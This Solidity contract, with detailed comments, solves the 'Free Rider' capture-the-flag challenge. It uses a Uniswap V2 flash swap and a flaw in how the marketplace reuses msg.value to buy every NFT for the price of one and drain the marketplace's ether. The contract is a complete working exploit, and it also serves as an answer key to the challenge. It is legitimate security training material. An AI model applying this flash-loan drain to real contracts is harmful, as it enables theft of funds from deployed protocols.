// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { IFreeRiderNFTMarketplace } from "./Interfaces/IFreeRiderNFTMarketplace.i.sol";
import { IFreeRiderRecovery } from "./Interfaces/IFreeRiderRecovery.i.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IUniswapV2Factory } from "../helpers/uniswap-v2-solc0.6-puppetv2/IUniswapV2Factory.i.sol";
import { IUniswapV2Pair } from "../helpers/uniswap-v2-solc0.6-puppetv2/IUniswapV2Pair.i.sol";
import { IWETH } from "../09 - Puppet V2/Interfaces/IWETH.i.sol";

contract FreeSpirit {
    address private player;
    IWETH private weth;
    IERC20 private token;
    IERC721 private nft;
    IUniswapV2Pair private weth_token_pair;
    IFreeRiderNFTMarketplace private marketplace;
    IFreeRiderRecovery private recovery;

    uint256 private constant NFT_PRICE = 15 * 1e18;
    uint256 private constant AMOUNT_OF_NFTS = 6;

    constructor(
        address _weth,
        address _token,
        address _nft,
        address _weth_token_pair,
        address _marketplace,
        address _recovery,
        address _player
    ) payable {
        player = _player;
        weth = IWETH(_weth);
        token = IERC20(_token);
        nft = IERC721(_nft);
        weth_token_pair = IUniswapV2Pair(_weth_token_pair);
        marketplace = IFreeRiderNFTMarketplace(payable(_marketplace));
        recovery = IFreeRiderRecovery(_recovery);
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // The player starts with 0.1 eth, which once again has been trasnferred
        // into this contract for you to use. And as always, any eth and tokens
        // should be sent back to the player account in order to pass the
        // challenge.

        // Additionally, you may or may not need to create extra functions in
        // this contract, or another contract that you deploy from this contract
        // or from the test. As always, you are free to modify this contract to
        // suit your needs and/or create additional contracts.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The solution to this challenge relies on a mistake in the NFT
        // marketplace contract. Specifically, in the _buyOne(), the logic
        // to pay the seller the money for the NFT purchase is wrong. The line
        // of code `payable(_token.ownerOf(tokenId)).sendValue(priceToPay);`
        // happens after the NFT has already been transferred to the buyer,
        // so instead of the seller being paid, the buyer is simply refunded
        // their money!

        // This flaw can be further exploited because the payment/refund uses
        // the msg.value, which means if we use the buyMany() function to
        // buy several NFTs in the same transaction, the contract will "refund"
        // us the purchase price on every _buyOne() call, allowing us to
        // drain the contract of its ether.

        // However, because we only start with 0.1 ether, we must find a way
        // to get enough ether to initiate the NFT purchase in the first place.
        // This poses a problem, until we look at the test contract for the
        // challenge, which shows that there is a Uniswap V2 pool for the pair
        // DVT/WETH. And all Uniswap V2 pools have built-in flash loan
        // capabilities for both tokens in the pair. (The way the swap() function
        // works simply validates that the overall trade of a Uniswap V2 pair
        // maintains the constant product formula, plus the fee, so we can use
        // that to perform a "no-op" trade that simply borrows one of the tokens
        // and then sends it back, along with the fee. In effect, a flash loan!)

        // For more information on how Uniswap V2 works, I have found the free
        // RareSkills "book" set of posts very helpful:
        // https://www.rareskills.io/uniswap-v2-book

        // Anyway, the flash loan functionality means we can take a WETH flash
        // loan, convert the WETH to ETH, purchase the NFTs, get "refunded"
        // for more than we put in, and repay the flash loan. As long as we can
        // do this in one transaction so the flash loan doesn't revert, we
        // should be all set.

        // Alright, let's code the exploit!

        // Under the "Triggering a Flash Swap" section here:
        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
        // we see that there must be a non-zero length data parameter for a
        // flash loan transaction.
        bytes memory data = bytes.concat(
            "There must be non-empty calldata, but we're not using it, so here is some dummy text.",
            "This data gets sent back to us as the last parameter in the uniswapV2Call() function."
        );

        // We dont' know whether the pair counts weth as token0 or token1, so
        // we need to find out
        bool token0_is_weth = weth_token_pair.token0() == address(weth) ? true : false;

        // Once we know which token is weth, we take out a weth flash loan
        if (token0_is_weth) {
            weth_token_pair.swap(NFT_PRICE, 0, address(this), data);
        } else {
            weth_token_pair.swap(0, NFT_PRICE, address(this), data);
        }

        // The flash loan does a callback to the sender (this contract) and
        // calls the uniswapV2Call() function, so we must implment it below.
        // The rest of the attack occurs in that function, because by the end
        // of the function, we must have repaid the flash loan. Thus, the whole
        // attach needs to happen within that function.

        // ******** uniswapV2Call() ******** //

        // Now the attack is over, and we own all the NFTs and have drained
        // all, or at least most of, the marketplace's ether as well. Now we
        // simply need to send the NFT's to the "recovery" contract in order
        // to claim the bounty/prize money.

        // Send NFT's to recovery address
        for (uint256 i; i < AMOUNT_OF_NFTS; ++i) {
            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(player));
        }

        // Send all of our eth to the player account.
        (bool success,) = player.call{ value: address(this).balance }("");
        require(success);

        // Done!

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=TgtRCjFACDk
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        // We ignore and don't give a variable name to the last calldata parameter,
        // because we aren't using it.

        // Ensure that this function is only called by the Uniswap pair contract,
        // and that the Uniswap callback was initiated by this contract.
        require(msg.sender == address(weth_token_pair));
        require(sender == address(this));

        // Determine which of the two input amounts is our weth loan, by using
        // whichever amount is not 0.
        uint256 loanAmount = amount0 != 0 ? amount0 : amount1;

        // Determine the required fee
        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps#single-token
        // 0.3009027% fee for flash loan (+1 to account for rounding errors)
        uint256 repayAmount = ((loanAmount * 1000) / 997) + (1 wei);
        // If this amount is too low, we will see a revert with "K" as the
        // reason. ("K" is the constant product formula result: x*y=k)

        // Convert all weth to native eth
        weth.withdraw(weth.balanceOf(address(this)));

        // Double-check that we have enough eth to buy an NFT, and that if we
        // can repay our loan assuming we do in fact get refunded the NFT
        // purchase price.
        require(address(this).balance > NFT_PRICE);
        require(address(this).balance >= repayAmount);

        // We must do the buy for all tokens at once if we want to drain the
        // marketplace contract of its eth. By buying all tokens at once,
        // we use the same msg.value for all 6 purchases.
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i; i < AMOUNT_OF_NFTS; ++i) {
            tokenIds[i] = i;
        }

        // In order to purchase our NFTs, we need to have the onERC721Received()
        // function that we implemented below, because the NFTs are transferred
        // via safeTransferFrom, which requires that contracts that receive NFTs
        // have that function. (This is a safety measure to validate that a
        // contract is intentionally capable of receiving NFTs and has some
        // logic in place to use them.)
        marketplace.buyMany{ value: NFT_PRICE }(tokenIds);

        // Once again, double-check we can still repay our loan
        require(address(this).balance >= repayAmount);

        // Now that we have our NFT's and more than enough ETH, we repay the
        // flash loan.
        weth.deposit{ value: repayAmount }();
        weth.transfer(address(weth_token_pair), repayAmount);

        // Attack finished!
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        // We ignore all the input variables because we aren't using them.
        // There's nothing we need to do when we receive the NFTs. So we just
        // return the expected value.
        // Other contracts that utilize NFTs for something may want to do
        // stuff or emit logs when they receive an NFT. We don't care about
        // doing anything, we just want the safeTransferFrom() function to
        // work.

        // The safeTransferFrom() function checks that the return value from
        // calling this function is exactly this.
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
